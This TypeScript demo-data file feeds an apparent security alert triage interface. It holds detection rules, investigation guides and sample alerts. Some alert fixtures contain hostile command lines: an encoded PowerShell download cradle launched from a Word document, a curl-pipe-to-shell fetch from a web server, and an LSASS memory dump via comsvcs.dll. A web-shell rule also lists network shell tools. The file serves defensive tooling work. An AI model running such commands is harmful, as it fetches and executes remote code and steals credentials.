export type Severity = 'low' | 'medium' | 'high' | 'critical';
export type AlertStatus = 'open' | 'acknowledged' | 'closed';

export interface RuleRef {
  id: string;
  name: string;
  description: string;
  type: 'query' | 'eql' | 'threshold' | 'machine_learning' | 'new_terms';
  query: string;
  index: string[];
  interval: string;
  from: string;
  author: string[];
  license: string;
  references: string[];
  tags: string[];
  tactic: { id: string; name: string; reference: string };
  technique: { id: string; name: string; reference: string };
  investigationGuide: string;
  version: number;
  falsePositives: string[];
}

export interface HostRef {
  name: string;
  id: string;
  os: { family: string; name: string; version: string };
  ip: string[];
  mac: string[];
  riskScore: number;
  riskLevel: 'Unknown' | 'Low' | 'Moderate' | 'High' | 'Critical';
  criticality: 'low_impact' | 'medium_impact' | 'high_impact' | 'extreme_impact' | 'unassigned';
  lastSeen: string;
  firstSeen: string;
  agentStatus: 'Healthy' | 'Unhealthy' | 'Offline';
  policy: string;
}

export interface UserRef {
  name: string;
  domain: string;
  id: string;
  riskScore: number;
  riskLevel: 'Unknown' | 'Low' | 'Moderate' | 'High' | 'Critical';
  criticality: 'low_impact' | 'medium_impact' | 'high_impact' | 'extreme_impact' | 'unassigned';
  lastSeen: string;
  firstSeen: string;
  email: string;
  roles: string[];
}

export interface Alert {
  id: string;
  timestamp: string;
  originalTime: string;
  rule: RuleRef;
  severity: Severity;
  riskScore: number;
  reason: string;
  status: AlertStatus;
  workflowStatusUpdatedAt?: string;
  assignees: string[];
  host: HostRef;
  user: UserRef;
  process?: {
    name: string;
    pid: number;
    executable: string;
    commandLine: string;
    parent: { name: string; pid: number; commandLine: string };
    hash: { sha256: string };
  };
  file?: { name: string; path: string; hash: { sha256: string } };
  source?: { ip: string; port: number };
  destination?: { ip: string; port: number; domain?: string };
  network?: { protocol: string; transport: string; direction: string };
  eventCategory: string[];
  eventAction: string;
  eventKind: 'signal';
  ancestors: number;
  sessionId: string;
  relatedAlertIds: string[];
  threatMatches: number;
  notes: string[];
  caseIds: string[];
}

export const SEVERITY_COLOR: Record<Severity, string> = {
  low: '#54B399',
  medium: '#D6BF57',
  high: '#DA8B45',
  critical: '#E7664C',
};

export const SEVERITY_LABEL: Record<Severity, string> = {
  low: 'Low',
  medium: 'Medium',
  high: 'High',
  critical: 'Critical',
};

export const CURRENT_USER = {
  uid: 'u_pavel',
  username: 'pavel.manko',
  fullName: 'Pavel Manko',
  email: 'pavel.manko@example.com',
  initials: 'PM',
  color: '#6DCCB1',
};

export const USERS_DIRECTORY: Record<
  string,
  { uid: string; username: string; fullName: string; initials: string; color: string }
> = {
  u_pavel: CURRENT_USER,
  u_ana: {
    uid: 'u_ana',
    username: 'ana.ruiz',
    fullName: 'Ana Ruiz',
    initials: 'AR',
    color: '#F5A35C',
  },
  u_sam: {
    uid: 'u_sam',
    username: 'sam.chen',
    fullName: 'Sam Chen',
    initials: 'SC',
    color: '#BFA1E2',
  },
  u_lee: {
    uid: 'u_lee',
    username: 'lee.okafor',
    fullName: 'Lee Okafor',
    initials: 'LO',
    color: '#61A2FF',
  },
};

const NOW = new Date('2026-10-19T14:05:00.000Z').getTime();
const minutesAgo = (minutes: number) => new Date(NOW - minutes * 60_000).toISOString();
const hoursAgo = (hours: number) => minutesAgo(hours * 60);
const daysAgo = (days: number) => hoursAgo(days * 24);

const hosts: Record<string, HostRef> = {
  'win-fin-07': {
    name: 'win-fin-07',
    id: 'c1f6a0d2-7c3b-4b2e-9a6c-fin07',
    os: { family: 'windows', name: 'Windows', version: '11 23H2' },
    ip: ['10.20.4.57', 'fe80::9c1a:2f3e:8b4d:7a21'],
    mac: ['00-50-56-A1-3F-07'],
    riskScore: 87,
    riskLevel: 'High',
    criticality: 'high_impact',
    lastSeen: minutesAgo(4),
    firstSeen: daysAgo(212),
    agentStatus: 'Healthy',
    policy: 'Finance workstations',
  },
  'srv-dc-01': {
    name: 'srv-dc-01',
    id: 'a4f8e1c7-11aa-4e9f-bd0e-dc01',
    os: { family: 'windows', name: 'Windows Server', version: '2022' },
    ip: ['10.20.0.10'],
    mac: ['00-50-56-A1-00-10'],
    riskScore: 93,
    riskLevel: 'Critical',
    criticality: 'extreme_impact',
    lastSeen: minutesAgo(1),
    firstSeen: daysAgo(640),
    agentStatus: 'Healthy',
    policy: 'Domain controllers',
  },
  'mac-eng-22': {
    name: 'mac-eng-22',
    id: '0bd2a3c8-5f9e-4ad1-8f23-eng22',
    os: { family: 'darwin', name: 'macOS', version: '15.1' },
    ip: ['10.30.8.122'],
    mac: ['F0-18-98-3A-22-9C'],
    riskScore: 41,
    riskLevel: 'Moderate',
    criticality: 'medium_impact',
    lastSeen: minutesAgo(9),
    firstSeen: daysAgo(98),
    agentStatus: 'Healthy',
    policy: 'Engineering laptops',
  },
  'lnx-web-03': {
    name: 'lnx-web-03',
    id: '7e2c9f41-0d6a-4c3b-9e5f-web03',
    os: { family: 'debian', name: 'Ubuntu', version: '22.04.4 LTS' },
    ip: ['10.40.1.33', '203.0.113.33'],
    mac: ['02-42-AC-11-00-03'],
    riskScore: 68,
    riskLevel: 'High',
    criticality: 'high_impact',
    lastSeen: minutesAgo(2),
    firstSeen: daysAgo(420),
    agentStatus: 'Healthy',
    policy: 'Web tier',
  },
  'lnx-ci-runner-12': {
    name: 'lnx-ci-runner-12',
    id: '9b1d4e62-3c8a-4f7b-a1e0-ci12',
    os: { family: 'debian', name: 'Debian', version: '12' },
    ip: ['10.50.2.112'],
    mac: ['02-42-AC-14-02-70'],
    riskScore: 22,
    riskLevel: 'Low',
    criticality: 'low_impact',
    lastSeen: minutesAgo(15),
    firstSeen: daysAgo(31),
    agentStatus: 'Unhealthy',
    policy: 'CI runners',
  },
};

const users: Record<string, UserRef> = {
  'j.alvarez': {
    name: 'j.alvarez',
    domain: 'CORP',
    id: 'S-1-5-21-1004336348-1177238915-682003330-1104',
    riskScore: 82,
    riskLevel: 'High',
    criticality: 'medium_impact',
    lastSeen: minutesAgo(4),
    firstSeen: daysAgo(500),
    email: 'j.alvarez@corp.example.com',
    roles: ['Finance analysts', 'VPN users'],
  },
  administrator: {
    name: 'administrator',
    domain: 'CORP',
    id: 'S-1-5-21-1004336348-1177238915-682003330-500',
    riskScore: 96,
    riskLevel: 'Critical',
    criticality: 'extreme_impact',
    lastSeen: minutesAgo(1),
    firstSeen: daysAgo(900),
    email: 'administrator@corp.example.com',
    roles: ['Domain Admins'],
  },
  'r.kim': {
    name: 'r.kim',
    domain: 'CORP',
    id: 'S-1-5-21-1004336348-1177238915-682003330-2210',
    riskScore: 35,
    riskLevel: 'Moderate',
    criticality: 'low_impact',
    lastSeen: minutesAgo(9),
    firstSeen: daysAgo(120),
    email: 'r.kim@corp.example.com',
    roles: ['Engineering'],
  },
  'www-data': {
    name: 'www-data',
    domain: 'lnx-web-03',
    id: '33',
    riskScore: 59,
    riskLevel: 'Moderate',
    criticality: 'unassigned',
    lastSeen: minutesAgo(2),
    firstSeen: daysAgo(420),
    email: '-',
    roles: ['service account'],
  },
  'ci-bot': {
    name: 'ci-bot',
    domain: 'lnx-ci-runner-12',
    id: '1001',
    riskScore: 12,
    riskLevel: 'Low',
    criticality: 'unassigned',
    lastSeen: minutesAgo(15),
    firstSeen: daysAgo(31),
    email: '-',
    roles: ['service account'],
  },
};

const rules: Record<string, RuleRef> = {
  powershellEncoded: {
    id: 'r-7f1a-powershell-encoded',
    name: 'PowerShell Encoded Command Execution',
    description:
      'Identifies the execution of PowerShell with an encoded command argument. Adversaries frequently obfuscate PowerShell payloads with Base64 encoding to evade detection and deliver follow-on stages.',
    type: 'eql',
    query:
      'process where event.type == "start" and\n  process.name : ("powershell.exe", "pwsh.exe") and\n  process.args : ("-enc", "-EncodedCommand", "-e") and\n  not process.parent.name : ("ConfigMgr*.exe", "sccm*.exe")',
    index: ['logs-endpoint.events.process-*', 'winlogbeat-*', 'logs-windows.*'],
    interval: '5m',
    from: 'now-9m',
    author: ['Elastic'],
    license: 'Elastic License v2',
    references: ['https://attack.mitre.org/techniques/T1059/001/'],
    tags: ['Domain: Endpoint', 'OS: Windows', 'Use Case: Threat Detection', 'Tactic: Execution'],
    tactic: { id: 'TA0002', name: 'Execution', reference: 'https://attack.mitre.org/tactics/TA0002/' },
    technique: {
      id: 'T1059.001',
      name: 'PowerShell',
      reference: 'https://attack.mitre.org/techniques/T1059/001/',
    },
    investigationGuide: `## Triage and analysis

### Investigating PowerShell Encoded Command Execution

PowerShell is a scripting environment included with Windows that is used by both attackers and administrators. Encoded commands are a common obfuscation technique.

#### Possible investigation steps

- Decode the Base64 payload and review the resulting script for suspicious activity.
- Investigate the process execution chain (parent process tree) for unknown processes.
- Check whether the user \`{{user.name}}\` normally runs PowerShell on \`{{host.name}}\`.
- Review network connections made by the process after launch.

#### False positive analysis

- Legitimate administrative scripts and software deployment tools can use encoded commands. Consider adding exceptions for known tooling.

#### Response and remediation

- Initiate the incident response process based on the outcome of the triage.
- Isolate the involved host to prevent further post-compromise behavior.
- Reset the password of the compromised user and review their privileges.`,
    version: 112,
    falsePositives: ['Software deployment tooling that uses encoded commands.'],
  },
  kerberoasting: {
    id: 'r-2b9c-kerberoasting',
    name: 'Potential Kerberoasting via RC4 Service Ticket Request',
    description:
      'Detects a Kerberos service ticket (TGS) request using the weaker RC4 encryption type, which can indicate an attempt to obtain crackable service account hashes (Kerberoasting).',
    type: 'query',
    query:
      'event.code:4769 and winlog.event_data.TicketEncryptionType:0x17 and\nnot winlog.event_data.ServiceName:*$ and winlog.event_data.Status:0x0',
    index: ['winlogbeat-*', 'logs-system.security*', 'logs-windows.forwarded*'],
    interval: '5m',
    from: 'now-6m',
    author: ['Elastic'],
    license: 'Elastic License v2',
    references: ['https://attack.mitre.org/techniques/T1558/003/'],
    tags: ['Domain: Endpoint', 'OS: Windows', 'Tactic: Credential Access', 'Data Source: Active Directory'],
    tactic: {
      id: 'TA0006',
      name: 'Credential Access',
      reference: 'https://attack.mitre.org/tactics/TA0006/',
    },
    technique: {
      id: 'T1558.003',
      name: 'Kerberoasting',
      reference: 'https://attack.mitre.org/techniques/T1558/003/',
    },
    investigationGuide: `## Triage and analysis

### Investigating Potential Kerberoasting

Kerberoasting targets service accounts with Service Principal Names (SPNs). Attackers request service tickets encrypted with RC4 and crack them offline.

#### Possible investigation steps

- Identify the account that requested the ticket and the service it targeted.
- Check how many distinct SPNs were requested by the same account in a short window.
- Validate whether the requesting host is a known administrative workstation.

#### Response and remediation

- Rotate the password of the targeted service account.
- Enforce AES encryption for service accounts where possible.`,
    version: 48,
    falsePositives: ['Legacy applications that only support RC4.'],
  },
  webshell: {
    id: 'r-91de-webshell',
    name: 'Web Shell Detection: Script Process Child of Common Web Processes',
    description:
      'Identifies suspicious commands executed via a web server, which may suggest a vulnerability and remote shell access.',
    type: 'eql',
    query:
      'process where event.type == "start" and\n  process.parent.name : ("apache2", "nginx", "httpd", "php-fpm*") and\n  process.name : ("bash", "sh", "dash", "python*", "perl", "curl", "wget", "nc", "ncat")',
    index: ['logs-endpoint.events.process-*', 'auditbeat-*'],
    interval: '5m',
    from: 'now-9m',
    author: ['Elastic'],
    license: 'Elastic License v2',
    references: ['https://attack.mitre.org/techniques/T1505/003/'],
    tags: ['Domain: Endpoint', 'OS: Linux', 'Tactic: Persistence', 'Tactic: Initial Access'],
    tactic: { id: 'TA0003', name: 'Persistence', reference: 'https://attack.mitre.org/tactics/TA0003/' },
    technique: {
      id: 'T1505.003',
      name: 'Web Shell',
      reference: 'https://attack.mitre.org/techniques/T1505/003/',
    },
    investigationGuide: `## Triage and analysis

### Investigating a potential web shell

A web shell gives an attacker persistent command execution through a compromised web application.

#### Possible investigation steps

- Review recently modified files under the web root for unknown scripts.
- Inspect the command line of the spawned shell and any outbound connections.
- Correlate with web access logs around the alert time.`,
    version: 20,
    falsePositives: ['CGI applications that legitimately spawn shells.'],
  },
  unusualLogin: {
    id: 'r-55aa-ml-unusual-login',
    name: 'Unusual Source IP for a User to Logon from',
    description:
      'A machine learning job detected a user logging in from an IP address that is unusual for the user. This can indicate credential theft or lateral movement.',
    type: 'machine_learning',
    query: 'anomaly_threshold: 75\nmachine_learning_job_id: auth_rare_source_ip_for_a_user',
    index: ['.ml-anomalies-*'],
    interval: '15m',
    from: 'now-45m',
    author: ['Elastic'],
    license: 'Elastic License v2',
    references: [],
    tags: ['Use Case: Identity and Access Audit', 'Rule Type: ML', 'Tactic: Initial Access'],
    tactic: {
      id: 'TA0001',
      name: 'Initial Access',
      reference: 'https://attack.mitre.org/tactics/TA0001/',
    },
    technique: {
      id: 'T1078',
      name: 'Valid Accounts',
      reference: 'https://attack.mitre.org/techniques/T1078/',
    },
    investigationGuide: `## Triage and analysis

- Confirm with the user whether the login from the unusual source IP was expected.
- Check geolocation and ASN of the source IP.
- Look for additional anomalies for the same user in the same period.`,
    version: 108,
    falsePositives: ['Users travelling or connecting through a new VPN egress.'],
  },
  sudoersMod: {
    id: 'r-c0de-sudoers',
    name: 'Sudoers File Modification',
    description:
      'A sudoers file defines which users run what commands with elevated privileges. Modifications to this file may be an attempt to escalate privileges or maintain persistence.',
    type: 'query',
    query: 'event.category:file and event.type:change and file.path:(/etc/sudoers* or /private/etc/sudoers*)',
    index: ['auditbeat-*', 'logs-endpoint.events.file-*'],
    interval: '5m',
    from: 'now-9m',
    author: ['Elastic'],
    license: 'Elastic License v2',
    references: [],
    tags: ['Domain: Endpoint', 'OS: Linux', 'OS: macOS', 'Tactic: Privilege Escalation'],
    tactic: {
      id: 'TA0004',
      name: 'Privilege Escalation',
      reference: 'https://attack.mitre.org/tactics/TA0004/',
    },
    technique: {
      id: 'T1548.003',
      name: 'Sudo and Sudo Caching',
      reference: 'https://attack.mitre.org/techniques/T1548/003/',
    },
    investigationGuide: `## Triage and analysis

- Diff the sudoers file against the last known good configuration.
- Identify the process and user that performed the modification.`,
    version: 9,
    falsePositives: ['Configuration management (Ansible, Puppet) applying sudoers changes.'],
  },
  credentialDump: {
    id: 'r-ab12-lsass',
    name: 'LSASS Memory Dump Creation',
    description:
      'Identifies the creation of a Local Security Authority Subsystem Service (lsass.exe) default memory dump. This may indicate an attempt to dump credentials.',
    type: 'eql',
    query: 'file where event.type != "deletion" and\n  file.name : ("lsass*.dmp", "dumpert.dmp", "Andrew.dmp", "SQLDmpr*.mdmp")',
    index: ['logs-endpoint.events.file-*', 'winlogbeat-*'],
    interval: '5m',
    from: 'now-9m',
    author: ['Elastic'],
    license: 'Elastic License v2',
    references: ['https://attack.mitre.org/techniques/T1003/001/'],
    tags: ['Domain: Endpoint', 'OS: Windows', 'Tactic: Credential Access'],
    tactic: {
      id: 'TA0006',
      name: 'Credential Access',
      reference: 'https://attack.mitre.org/tactics/TA0006/',
    },
    technique: {
      id: 'T1003.001',
      name: 'LSASS Memory',
      reference: 'https://attack.mitre.org/techniques/T1003/001/',
    },
    investigationGuide: `## Triage and analysis

- Identify the process that created the dump file and its parent.
- Check whether the dump file was exfiltrated or read by other processes.
- Consider isolating the host and resetting credentials of logged on users.`,
    version: 115,
    falsePositives: ['Legitimate crash dumps created by Windows Error Reporting.'],
  },
};

const reason = (parts: string[]) => parts.join(' ');

const makeAlert = (
  index: number,
  partial: Omit<Alert, 'id' | 'eventKind' | 'notes' | 'relatedAlertIds' | 'caseIds'> &
    Partial<Pick<Alert, 'notes' | 'relatedAlertIds' | 'caseIds'>>
): Alert => ({
  id: `alert-${String(index).padStart(3, '0')}`,
  eventKind: 'signal',
  notes: [],
  relatedAlertIds: [],
  caseIds: [],
  ...partial,
});

const baseAlerts: Alert[] = [
  makeAlert(1, {
    timestamp: minutesAgo(4),
    originalTime: minutesAgo(5),
    rule: rules.powershellEncoded,
    severity: 'high',
    riskScore: 73,
    status: 'open',
    assignees: ['u_pavel'],
    host: hosts['win-fin-07'],
    user: users['j.alvarez'],
    process: {
      name: 'powershell.exe',
      pid: 7712,
      executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      commandLine:
        'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMgAvAGEALgBwAHMAMQAnACkA',
      parent: {
        name: 'WINWORD.EXE',
        pid: 5120,
        commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\j.alvarez\\Downloads\\Q3_Invoice_Summary.docm"',
      },
      hash: { sha256: '3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b' },
    },
    source: { ip: '10.20.4.57', port: 51422 },
    destination: { ip: '198.51.100.22', port: 80 },
    network: { protocol: 'http', transport: 'tcp', direction: 'egress' },
    eventCategory: ['process'],
    eventAction: 'start',
    reason: reason([
      'process event with process powershell.exe, parent process WINWORD.EXE,',
      'by j.alvarez on win-fin-07 created high alert PowerShell Encoded Command Execution.',
    ]),
    ancestors: 2,
    sessionId: 'sess-7f1a-0001',
    relatedAlertIds: ['alert-006', 'alert-009'],
    threatMatches: 1,
    notes: ['Payload decodes to an IEX download cradle; host isolated pending review.'],
    caseIds: ['case-1042'],
  }),
  makeAlert(2, {
    timestamp: minutesAgo(11),
    originalTime: minutesAgo(12),
    rule: rules.kerberoasting,
    severity: 'critical',
    riskScore: 99,
    status: 'open',
    assignees: [],
    host: hosts['srv-dc-01'],
    user: users.administrator,
    source: { ip: '10.20.4.57', port: 49872 },
    destination: { ip: '10.20.0.10', port: 88 },
    network: { protocol: 'kerberos', transport: 'tcp', direction: 'ingress' },
    eventCategory: ['authentication'],
    eventAction: 'service-ticket-requested',
    reason: reason([
      'authentication event by administrator on srv-dc-01 created critical alert',
      'Potential Kerberoasting via RC4 Service Ticket Request.',
    ]),
    ancestors: 1,
    sessionId: 'sess-2b9c-0002',
    relatedAlertIds: ['alert-001'],
    threatMatches: 0,
  }),
  makeAlert(3, {
    timestamp: minutesAgo(23),
    originalTime: minutesAgo(24),
    rule: rules.webshell,
    severity: 'high',
    riskScore: 78,
    status: 'acknowledged',
    workflowStatusUpdatedAt: minutesAgo(8),
    assignees: ['u_ana'],
    host: hosts['lnx-web-03'],
    user: users['www-data'],
    process: {
      name: 'bash',
      pid: 24119,
      executable: '/usr/bin/bash',
      commandLine: 'bash -c "curl -s http://203.0.113.80/x.sh | sh"',
      parent: { name: 'php-fpm8.1', pid: 1187, commandLine: 'php-fpm: pool www' },
      hash: { sha256: '7a1c6b4d7a0d9fc0a0a64f1cce8f7f1f0b8bb6aa3ef5c4d9e2b1a0f9c8d7e6f5' },
    },
    source: { ip: '203.0.113.33', port: 44122 },
    destination: { ip: '203.0.113.80', port: 80 },
    network: { protocol: 'http', transport: 'tcp', direction: 'egress' },
    eventCategory: ['process'],
    eventAction: 'exec',
    reason: reason([
      'process event with process bash, parent process php-fpm8.1, by www-data on lnx-web-03',
      'created high alert Web Shell Detection: Script Process Child of Common Web Processes.',
    ]),
    ancestors: 3,
    sessionId: 'sess-91de-0003',
    relatedAlertIds: ['alert-012'],
    threatMatches: 2,
    notes: ['Blocked outbound to 203.0.113.80 at the edge firewall.'],
  }),
  makeAlert(4, {
    timestamp: minutesAgo(38),
    originalTime: minutesAgo(40),
    rule: rules.unusualLogin,
    severity: 'medium',
    riskScore: 47,
    status: 'open',
    assignees: [],
    host: hosts['mac-eng-22'],
    user: users['r.kim'],
    source: { ip: '185.220.101.4', port: 60211 },
    destination: { ip: '10.30.8.122', port: 22 },
    network: { protocol: 'ssh', transport: 'tcp', direction: 'ingress' },
    eventCategory: ['authentication'],
    eventAction: 'logged-in',
    reason: reason([
      'authentication event with source 185.220.101.4:60211 by r.kim on mac-eng-22',
      'created medium alert Unusual Source IP for a User to Logon from.',
    ]),
    ancestors: 1,
    sessionId: 'sess-55aa-0004',
    threatMatches: 1,
  }),
  makeAlert(5, {
    timestamp: minutesAgo(52),
    originalTime: minutesAgo(53),
    rule: rules.sudoersMod,
    severity: 'low',
    riskScore: 21,
    status: 'open',
    assignees: ['u_sam'],
    host: hosts['lnx-ci-runner-12'],
    user: users['ci-bot'],
    process: {
      name: 'vim',
      pid: 3304,
      executable: '/usr/bin/vim.basic',
      commandLine: 'vim /etc/sudoers.d/ci-bot',
      parent: { name: 'bash', pid: 3301, commandLine: '-bash' },
      hash: { sha256: '0f1e2d3c4b5a69788796a5b4c3d2e1f00112233445566778899aabbccddeeff' },
    },
    file: {
      name: 'ci-bot',
      path: '/etc/sudoers.d/ci-bot',
      hash: { sha256: 'd41d8cd98f00b204e9800998ecf8427e0000000000000000000000000000beef' },
    },
    eventCategory: ['file'],
    eventAction: 'change',
    reason: reason([
      'file event with process vim, file ci-bot, by ci-bot on lnx-ci-runner-12',
      'created low alert Sudoers File Modification.',
    ]),
    ancestors: 1,
    sessionId: 'sess-c0de-0005',
    threatMatches: 0,
  }),
  makeAlert(6, {
    timestamp: minutesAgo(64),
    originalTime: minutesAgo(65),
    rule: rules.credentialDump,
    severity: 'critical',
    riskScore: 97,
    status: 'open',
    assignees: ['u_pavel', 'u_lee'],
    host: hosts['win-fin-07'],
    user: users['j.alvarez'],
    process: {
      name: 'rundll32.exe',
      pid: 8120,
      executable: 'C:\\Windows\\System32\\rundll32.exe',
      commandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\lsass.dmp full',
      parent: { name: 'powershell.exe', pid: 7712, commandLine: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc ...' },
      hash: { sha256: 'b1946ac92492d2347c6235b4d2611184e4f1a7c9d1e8e3c5a2b7d4f6e8c9a0b1' },
    },
    file: {
      name: 'lsass.dmp',
      path: 'C:\\Users\\Public\\lsass.dmp',
      hash: { sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' },
    },
    eventCategory: ['file'],
    eventAction: 'creation',
    reason: reason([
      'file event with process rundll32.exe, file lsass.dmp, by j.alvarez on win-fin-07',
      'created critical alert LSASS Memory Dump Creation.',
    ]),
    ancestors: 3,
    sessionId: 'sess-7f1a-0001',
    relatedAlertIds: ['alert-001'],
    threatMatches: 0,
    caseIds: ['case-1042'],
  }),
];

const variantsFor = (alert: Alert, index: number, minutes: number, severity?: Severity): Alert => {
  const sev = severity ?? alert.severity;
  const risk = sev === 'critical' ? 90 + (index % 9) : sev === 'high' ? 70 + (index % 15) : sev === 'medium' ? 40 + (index % 20) : 10 + (index % 25);
  return {
    ...alert,
    id: `alert-${String(index).padStart(3, '0')}`,
    timestamp: minutesAgo(minutes),
    originalTime: minutesAgo(minutes + 1),
    severity: sev,
    riskScore: risk,
    status: index % 7 === 0 ? 'closed' : index % 5 === 0 ? 'acknowledged' : 'open',
    workflowStatusUpdatedAt: index % 7 === 0 || index % 5 === 0 ? minutesAgo(minutes - 2) : undefined,
    assignees: index % 4 === 0 ? ['u_ana'] : index % 6 === 0 ? ['u_sam'] : [],
    reason: alert.reason.replace(
      /created (low|medium|high|critical) alert/,
      `created ${sev} alert`
    ),
    notes: [],
    caseIds: [],
    relatedAlertIds: [],
    sessionId: `${alert.sessionId}-${index}`,
  };
};

export const ALERTS: Alert[] = [
  ...baseAlerts,
  variantsFor(baseAlerts[0], 7, 81, 'high'),
  variantsFor(baseAlerts[3], 8, 95, 'medium'),
  variantsFor(baseAlerts[0], 9, 112, 'medium'),
  variantsFor(baseAlerts[1], 10, 131, 'critical'),
  variantsFor(baseAlerts[4], 11, 150, 'low'),
  variantsFor(baseAlerts[2], 12, 168, 'high'),
  variantsFor(baseAlerts[3], 13, 190, 'low'),
  variantsFor(baseAlerts[0], 14, 205, 'high'),
  variantsFor(baseAlerts[5], 15, 240, 'critical'),
  variantsFor(baseAlerts[4], 16, 266, 'low'),
  variantsFor(baseAlerts[3], 17, 290, 'medium'),
  variantsFor(baseAlerts[2], 18, 330, 'high'),
  variantsFor(baseAlerts[0], 19, 372, 'medium'),
  variantsFor(baseAlerts[1], 20, 410, 'critical'),
  variantsFor(baseAlerts[4], 21, 455, 'low'),
  variantsFor(baseAlerts[3], 22, 480, 'medium'),
  variantsFor(baseAlerts[0], 23, 520, 'high'),
  variantsFor(baseAlerts[2], 24, 600, 'high'),
];

export const getAlertById = (id: string): Alert | undefined => ALERTS.find((a) => a.id === id);

/** Flat ECS-ish view used by the Table / JSON tabs and the highlighted fields. */
export const alertToDocument = (alert: Alert): Record<string, unknown> => {
  const doc: Record<string, unknown> = {
    '@timestamp': alert.timestamp,
    'event.kind': 'signal',
    'event.category': alert.eventCategory,
    'event.action': alert.eventAction,
    'kibana.alert.rule.name': alert.rule.name,
    'kibana.alert.rule.uuid': alert.rule.id,
    'kibana.alert.rule.type': alert.rule.type,
    'kibana.alert.rule.version': alert.rule.version,
    'kibana.alert.rule.description': alert.rule.description,
    'kibana.alert.rule.threat.tactic.name': alert.rule.tactic.name,
    'kibana.alert.rule.threat.technique.name': alert.rule.technique.name,
    'kibana.alert.severity': alert.severity,
    'kibana.alert.risk_score': alert.riskScore,
    'kibana.alert.reason': alert.reason,
    'kibana.alert.workflow_status': alert.status,
    'kibana.alert.workflow_assignee_ids': alert.assignees,
    'kibana.alert.original_time': alert.originalTime,
    'kibana.alert.uuid': `${alert.id}-9e5f6a7b8c9d0e1f2a3b4c5d6e7f8091`,
    'kibana.alert.ancestors': alert.ancestors,
    'kibana.alert.depth': alert.ancestors,
    'kibana.space_ids': ['default'],
    'host.name': alert.host.name,
    'host.id': alert.host.id,
    'host.os.family': alert.host.os.family,
    'host.os.name': alert.host.os.name,
    'host.os.version': alert.host.os.version,
    'host.ip': alert.host.ip,
    'host.mac': alert.host.mac,
    'host.risk.calculated_level': alert.host.riskLevel,
    'host.risk.calculated_score_norm': alert.host.riskScore,
    'host.asset.criticality': alert.host.criticality,
    'user.name': alert.user.name,
    'user.domain': alert.user.domain,
    'user.id': alert.user.id,
    'user.risk.calculated_level': alert.user.riskLevel,
    'user.risk.calculated_score_norm': alert.user.riskScore,
    'user.asset.criticality': alert.user.criticality,
    'agent.type': 'endpoint',
    'agent.version': '9.3.0',
    'data_stream.dataset': alert.eventCategory[0] === 'authentication' ? 'system.security' : `endpoint.events.${alert.eventCategory[0]}`,
    'process.entity_id': `MTIzNDU2Nzg5LTEyMzQ1Ni0${alert.id}`,
    'process.session_leader.entity_id': alert.sessionId,
  };
  if (alert.process) {
    doc['process.name'] = alert.process.name;
    doc['process.pid'] = alert.process.pid;
    doc['process.executable'] = alert.process.executable;
    doc['process.command_line'] = alert.process.commandLine;
    doc['process.parent.name'] = alert.process.parent.name;
    doc['process.parent.pid'] = alert.process.parent.pid;
    doc['process.parent.command_line'] = alert.process.parent.commandLine;
    doc['process.hash.sha256'] = alert.process.hash.sha256;
  }
  if (alert.file) {
    doc['file.name'] = alert.file.name;
    doc['file.path'] = alert.file.path;
    doc['file.hash.sha256'] = alert.file.hash.sha256;
  }
  if (alert.source) {
    doc['source.ip'] = alert.source.ip;
    doc['source.port'] = alert.source.port;
  }
  if (alert.destination) {
    doc['destination.ip'] = alert.destination.ip;
    doc['destination.port'] = alert.destination.port;
  }
  if (alert.network) {
    doc['network.protocol'] = alert.network.protocol;
    doc['network.transport'] = alert.network.transport;
    doc['network.direction'] = alert.network.direction;
  }
  return doc;
};

export const HIGHLIGHTED_FIELDS = [
  'host.name',
  'user.name',
  'process.name',
  'process.command_line',
  'process.parent.name',
  'file.name',
  'file.path',
  'source.ip',
  'destination.ip',
  'host.os.name',
  'agent.type',
  'kibana.alert.rule.type',
] as const;

export const ALERTS_BY_HOST = (alerts: Alert[]): Array<{ key: string; count: number }> => {
  const counts = new Map<string, number>();
  for (const a of alerts) counts.set(a.host.name, (counts.get(a.host.name) ?? 0) + 1);
  return [...counts.entries()].map(([key, count]) => ({ key, count })).sort((a, b) => b.count - a.count);
};

export const ALERTS_BY_RULE = (alerts: Alert[]): Array<{ key: string; count: number }> => {
  const counts = new Map<string, number>();
  for (const a of alerts) counts.set(a.rule.name, (counts.get(a.rule.name) ?? 0) + 1);
  return [...counts.entries()].map(([key, count]) => ({ key, count })).sort((a, b) => b.count - a.count);
};

export const ALERTS_BY_SEVERITY = (alerts: Alert[]): Record<Severity, number> => {
  const counts: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const a of alerts) counts[a.severity] += 1;
  return counts;
};

export const RULES = rules;
export const HOSTS = hosts;
export const USERS = users;
export const DEMO_NOW = NOW;
